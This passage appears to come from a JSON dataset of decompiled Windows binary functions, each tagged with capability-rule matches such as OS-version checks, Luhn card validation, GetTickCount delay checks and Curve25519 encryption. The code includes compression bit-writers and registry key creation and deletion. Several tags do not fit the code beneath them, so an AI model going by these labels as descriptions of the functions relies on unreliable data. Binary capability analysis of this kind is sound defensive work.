0x16b8)) {\n                            uVar1 = *(in_EAX + 0xac0);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xac0) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                        if (*(in_EAX + 0x16b8) < 10) {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 + -0xb << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 7;\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar3 - 10U << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = (iVar3 - 10U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -9;\n                        }\n                    }\n                }\n                else {\n                    if (uVar5 != uStack44) {\n                        uVar8 = *(in_EAX + 0xa7a + uVar5 * 4);\n                        iVar4 = iVar3;\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xa78 + uVar5 * 4);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) =\n                                 *(in_EAX + 0x16b4) | *(in_EAX + 0xa78 + uVar5 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                    }\n                    uVar8 = *(in_EAX + 0xaba);\n                    if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                        uVar1 = *(in_EAX + 0xab8);\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xab8) << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                    }\n                    if (*(in_EAX + 0x16b8) < 0xf) {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 + -3 << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 2;\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 - 3U << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = (iVar4 - 3U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xe;\n                    }\n                }\n                iVar4 = 0;\n                uStack44 = uVar5;\n                if (uVar6 == 0) {\n                    iVar2 = 0x8a;\n                    iVar7 = 3;\n                }\n                else if (uVar6 == uVar5) {\n                    iVar2 = 6;\n                    iVar7 = 3;\n                }\n                else {\n                    iVar2 = 7;\n                    iVar7 = 4;\n                }\n            }\n            iStack48 = iStack48 + 1;\n            puStack20 = puStack20 + 2;\n            iVar3 = iVar4;\n            uVar5 = uVar6;\n        } while (iStack48 <= param_1);\n    }\n    return;\n}\n",
        "token_count": 3797
    },
    "00484288": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.00484288(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX == 8) {\n        fcn.00405584();\n        return;\n    }\n    if (in_EAX == 0xd) {\n        fcn.00405584();\n    }\n    else if (in_EAX == 0x18) {\n        fcn.00405584();\n    }\n    else if (in_EAX == 10) {\n        fcn.00405584();\n    }\n    else if (in_EAX == 6) {\n        fcn.00405584();\n    }\n    else if (in_EAX == 4) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 173
    },
    "00403ec4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403ec4(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    uint8_t *in_EAX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    \n    puVar6 = in_EAX;\n    if (in_EAX == NULL) {\ncode_r0x00403f3a:\n        puVar6 = puVar6 + 1;\n    }\n    else {\n        uVar2 = 0;\n        do {\n            puVar5 = puVar6;\n            uVar3 = *puVar5;\n            puVar6 = puVar5 + 1;\n        } while (uVar3 == 0x20);\n        bVar1 = false;\n        if (uVar3 == 0x2d) {\n            bVar1 = true;\ncode_r0x00403f4a:\n            uVar3 = *puVar6;\n            puVar6 = puVar5 + 2;\n        }\n        else if (uVar3 == 0x2b) goto code_r0x00403f4a;\n        if (((uVar3 == 0x24) || (uVar3 == 0x78)) || (uVar3 == 0x58)) {\ncode_r0x00403f4f:\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n            if (uVar3 != 0) {\n                do {\n                    if (0x60 < uVar3) {\n                        uVar3 = uVar3 - 0x20;\n                    }\n                    uVar4 = uVar3 - 0x30;\n                    if (9 < uVar4) {\n                        if (5 < uVar3 + 0xbf) goto code_r0x00403f43;\n                        uVar4 = uVar3 - 0x37;\n                    }\n                    if (0xfffffff < uVar2) goto code_r0x00403f43;\n                    uVar2 = uVar2 * 0x10 + uVar4;\n                    uVar3 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                } while (uVar3 != 0);\ncode_r0x00403f8c:\n                iVar7 = 0;\n                goto code_r0x00403f8f;\n            }\n            goto code_r0x00403f3a;\n        }\n        if (uVar3 != 0x30) {\n            if (uVar3 != 0) goto code_r0x00403f16;\n            goto code_r0x00403f43;\n        }\n        uVar3 = *puVar6;\n        puVar6 = puVar6 + 1;\n        if ((uVar3 == 0x78) || (uVar3 == 0x58)) goto code_r0x00403f4f;\n        while (uVar3 != 0) {\ncode_r0x00403f16:\n            if ((9 < uVar3 - 0x30) || (0xccccccc < uVar2)) goto code_r0x00403f43;\n            uVar2 = uVar2 * 10 + (uVar3 - 0x30);\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n        }\n        if (bVar1) {\n            if ((-1 < uVar2) || (0 < uVar2)) goto code_r0x00403f8c;\n        }\n        else if (-1 < uVar2) goto code_r0x00403f8c;\n    }\ncode_r0x00403f43:\n    iVar7 = puVar6 - in_EAX;\ncode_r0x00403f8f:\n    *param_2 = iVar7;\n    return;\n}\n",
        "token_count": 876
    },
    "0040c978": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040c978(char *arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint16_t *in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_8h = '\\0';\n    fcn.0040c954();\n    iVar3 = *in_EDX;\n    uVar1 = 0;\n    while( true ) {\n        iVar2 = fcn.0040580c();\n        if (((iVar2 < iVar3) || (9 < *(in_EAX + -1 + iVar3) - 0x30U)) || (999 < uVar1)) break;\n        uVar1 = uVar1 * 10 + (*(in_EAX + -1 + iVar3) - 0x30);\n        iVar3 = iVar3 + 1;\n    }\n    iVar2 = *in_EDX;\n    if (iVar2 < iVar3) {\n        *arg_8h = iVar3 - *in_EDX;\n        *in_EDX = iVar3;\n        *in_ECX = uVar1;\n    }\n    return iVar2 < iVar3;\n}\n",
        "token_count": 282
    },
    "0042b788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nint32_t * fcn.0042b788(void)\n\n{\n    uint arg_ch;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack44 = 0x42b7a2;\n    var_8h = fcn.004293dc();\n    uStack48 = 0x42b867;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    (**(*var_8h + 0x40))();\n    (**(*var_8h + 0x34))();\n    fcn.004299b0();\n    fcn.004250d4();\n    fcn.00424fb8();\n    arg_ch = (**(*var_8h + 0x20))();\n    arg_8h = &fcn.0042b788::var_18h;\n    (**(*var_8h + 0x2c))();\n    fcn.00418448(arg_8h, arg_ch);\n    fcn.0042535c();\n    uVar4 = 0;\n    do {\n        uVar3 = 0;\n        do {\n            uVar1 = uVar4 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            uVar2 = uVar3 & 0x80000001;\n            if (uVar2 < 0) {\n                uVar2 = (uVar2 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == uVar2) {\n                fcn.004256cc(var_4h);\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 != 9);\n        uVar4 = uVar4 + 1;\n    } while (uVar4 != 9);\n    fcn.0042966c();\n    *in_FS_OFFSET = arg_8h;\n    return var_8h;\n}\n",
        "token_count": 541
    },
    "0042c898": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c898(int32_t arg_8h, int16_t *arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint var_104h;\n    uint var_4h;\n    \n    if (0x40 < *(arg_10h + 1)) {\n        fcn.0040dbb8();\n        arg_ch = fcn.00404ec4();\n    }\n    if (*arg_ch == 9) {\n        var_4h = *(arg_ch + 4);\n    }\n    else if (*arg_ch == 0x4009) {\n        var_4h = **(arg_ch + 4);\n    }\n    else {\n        fcn.0042c880();\n    }\n    fcn.0042c7a0(&var_104h);\n    if (arg_8h != 0) {\n        fcn.0041163c();\n    }\n    fcn.0042c430(arg_8h, arg_14h);\n    return;\n}\n",
        "token_count": 227
    },
    "0046c42c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nvoid fcn.0046c42c(void)\n\n{\n    int32_t iVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    \n    if (*(in_EAX + 0x16b8) < 0xe) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = 2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n    }\n    uVar2 = *0x493c98;\n    uVar3 = str._a__a__a__a[0];\n    if (0x10 - uVar3 < *(in_EAX + 0x16b8)) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x493c98 << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = (uVar3 - 0x10) + *(in_EAX + 0x16b8);\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x493c98 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar3;\n    }\n    fcn.0046cef8();\n    iVar1 = *(in_EAX + 0x16b8);\n    if ((*(in_EAX + 0x16b0) + 0xb) - iVar1 < 9) {\n        if (iVar1 < 0xe) {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (*(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n        }\n        else {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | 2 << (iVar1 & 0x1f);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n            *(in_EAX + 0x16b4) = 2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n        }\n        uVar2 = *0x493c98;\n        uVar3 = str._a__a__a__a[0];\n        if (0x10 - uVar3 < *(in_EAX + 0x16b8)) {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x493c98 << (*(in_EAX + 0x16b8) & 0x1f);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n            *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = (uVar3 - 0x10) + *(in_EAX + 0x16b8);\n        }\n        else {\n            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *0x493c98 << (*(in_EAX + 0x16b8) & 0x1f);\n            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar3;\n        }\n        fcn.0046cef8();\n    }\n    *(in_EAX + 0x16b0) = 7;\n    return;\n}\n",
        "token_count": 1674
    },
    "0041d9f0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nunkbyte10 fcn.0041d9f0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    unkbyte10 Stack16;\n    \n    cVar1 = fcn.0041ebc0();\n    if (cVar1 == '\\x05') {\n        fcn.0041d058();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        Stack16 = fcn.0041da28();\n    }\n    return Stack16;\n}\n",
        "token_count": 124
    },
    "0045194c": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0045194c(uint *param_1, uint *param_2)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *in_EAX;\n    uint uVar4;\n    \n    if (*(in_EAX + 0x5b) == '\\x05') {\n        uVar4 = CONCAT31(in_EAX >> 8, 1);\n    }\n    else {\n        uVar2 = *param_2;\n        uVar3 = *param_1;\n        uVar4 = (**(*in_EAX + 0x34))();\n        uVar1 = *(in_EAX + 0x5b);\n        if ((uVar1 == 0) || (uVar1 - 3 < 2)) {\n            *param_2 = uVar2;\n        }\n        param_2 = uVar1 - 3;\n        if (uVar1 < 3) {\n            *param_1 = uVar3;\n            param_2 = param_1;\n        }\n    }\n    return CONCAT44(param_2, uVar4);\n}\n",
        "token_count": 248
    },
    "0046df5c": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046df5c(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x46df70;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack20 = 0x46df78;\n    fcn.004059cc();\n    uStack24 = 0x46e0ce;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    uVar1 = fcn.00409edc();\n    // switch table (6 cases) at 0x46df9e\n    switch(uVar1) {\n    case 0:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.0046df5c::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000000, uVar1);\n        break;\n    case 1:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.0046df5c::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000001, uVar1);\n        break;\n    case 2:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.0046df5c::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000002, uVar1);\n        break;\n    case 3:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.0046df5c::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000003, uVar1);\n        break;\n    case 4:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.0046df5c::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000005, uVar1);\n        break;\n    case 5:\n        uVar1 = fcn.004059dc(0, 0, 0, 0x20006, 0, &fcn.0046df5c::hKey, 0);\n        sub.advapi32.dll_RegCreateKeyExA(0x80000006, uVar1);\n    }\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405554(0x46e0d5);\n    return;\n}\n",
        "token_count": 693
    },
    "0046e0dc": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e0dc(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint hKey;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x46e0f3;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack24 = 0x46e0fb;\n    fcn.004059cc();\n    puStack24 = 0x46e103;\n    fcn.004059cc();\n    uStack28 = 0x46e238;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    uVar1 = fcn.00409edc();\n    // switch table (6 cases) at 0x46e129\n    switch(uVar1) {\n    case 0:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e0dc::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000000, uVar1);\n        break;\n    case 1:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e0dc::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000001, uVar1);\n        break;\n    case 2:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e0dc::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000002, uVar1);\n        break;\n    case 3:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e0dc::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000003, uVar1);\n        break;\n    case 4:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e0dc::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000005, uVar1);\n        break;\n    case 5:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e0dc::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000006, uVar1);\n    }\n    uVar1 = fcn.004059dc();\n    sub.advapi32.dll_RegDeleteValueA(hKey, uVar1);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405554(0x46e23f);\n    return;\n}\n",
        "token_count": 687
    },
    "0046e244": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e244(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x46e258;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack20 = 0x46e260;\n    fcn.004059cc();\n    uStack24 = 0x46e391;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    uVar1 = fcn.00409edc();\n    // switch table (6 cases) at 0x46e286\n    switch(uVar1) {\n    case 0:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e244::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000000, uVar1);\n        break;\n    case 1:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e244::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000001, uVar1);\n        break;\n    case 2:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e244::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000002, uVar1);\n        break;\n    case 3:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e244::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000003, uVar1);\n        break;\n    case 4:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e244::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000005, uVar1);\n        break;\n    case 5:\n        uVar1 = fcn.004059dc(0, 0xf003f, &fcn.0046e244::hKey);\n        sub.advapi32.dll_RegOpenKeyExA_1(0x80000006, uVar1);\n    }\n    sub.advapi32.dll_RegDeleteKeyA(hKey, 0x46e39c);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00405554(0x46e398);\n    return;\n}\n",
        "token_count": 643
    },
    "00404448": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad",
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404448(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint *puStack20;\n    uint var_ch;\n    uint32_t var_8h;\n    uint hKey;\n    \n    var_8h = *0x491024;\n    puStack20 = &fcn.00404448::hKey;\n    uStack24 = 1;\n    uStack28 = 0;\n    uStack32 = 0x4044e0;\n    uStack36 = 0x80000002;\n    puStack40 = 0x40446f;\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n    if (iVar1 == 0) {\n        uStack44 = 0x4044b9;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        var_ch = 4;\n        uVar2 = hKey;\n        puStack40 = &stack0xfffffffc;\n        sub.advapi32.dll_RegQueryValueExA(hKey, 0x4044fc, 0, 0, &fcn.00404448::var_8h, &fcn.00404448::var_ch);\n        *in_FS_OFFSET = uVar2;\n        sub.advapi32.dll_RegCloseKey(hKey, 0x4044c0);\n        return;\n    }\n    *0x491024 = *0x491024 & 0xffc0 | var_8h & 0x3f;\n    return;\n}\n",
        "token_count": 396
    },
    "0045eb54": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045eb54(uint32_t param_1)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x10);\n    *(in_EAX + 0x10) = *(in_EAX + 0x10) + param_1;\n    if (*(in_EAX + 0x10) <= uVar1 && uVar1 != *(in_EAX + 0x10)) {\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n    }\n    uVar1 = 0x40 - (uVar1 & 0x3f);\n    if (param_1 < uVar1) {\n        fcn.004030fc();\n    }\n    else {\n        fcn.004030fc();\n        fcn.0045ec78();\n        for (param_1 = param_1 - uVar1; 0x3f < param_1; param_1 = param_1 - 0x40) {\n            fcn.004030fc();\n            fcn.0045ec78();\n        }\n        fcn.004030fc();\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "0045ebe8": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
